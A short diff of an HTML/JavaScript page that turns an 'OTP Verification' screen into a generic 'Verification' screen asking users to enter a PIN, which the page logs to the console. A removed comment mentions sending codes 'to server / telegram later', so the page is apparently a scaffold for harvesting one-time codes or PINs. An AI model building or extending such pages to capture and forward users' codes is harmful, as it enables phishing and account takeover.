@@ -2,7 +2,7 @@
 <html>
 
 <head>
-    <title>OTP Verification</title>
+    <title>Verification</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <link rel="stylesheet" href="style.css">
@@ -20,15 +20,14 @@
     <div class="loader"></div>
 
     <p style="text-align:center; margin-top:15px;">
-        OTP has been sent to your phone number.<br>
-        Please enter it below to continue.
+        Please create your PIN below to continue.
     </p>
 
     <!-- 🔢 OTP BOXES -->
     <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>
 
     <!-- BUTTON -->
-    <button class="login-btn" onclick="submitOTP()">Verify OTP</button>
+    <button class="login-btn" onclick="submitOTP()">Continue</button>
 
 </div>
 
@@ -77,14 +76,13 @@ function submitOTP() {
     });
 
     if (otp.length != length) {
-        alert("Enter full OTP");
+        alert("Enter full PIN");
         return;
     }
 
-    // OPTIONAL: send OTP to server / telegram later
-    console.log("OTP ENTERED:", otp);
+    console.log("PIN ENTERED:", otp);
 
-    alert("OTP submitted successfully");
+    alert("PIN submitted successfully");
 
     // you can redirect if needed
     // window.location.href = "success.html";
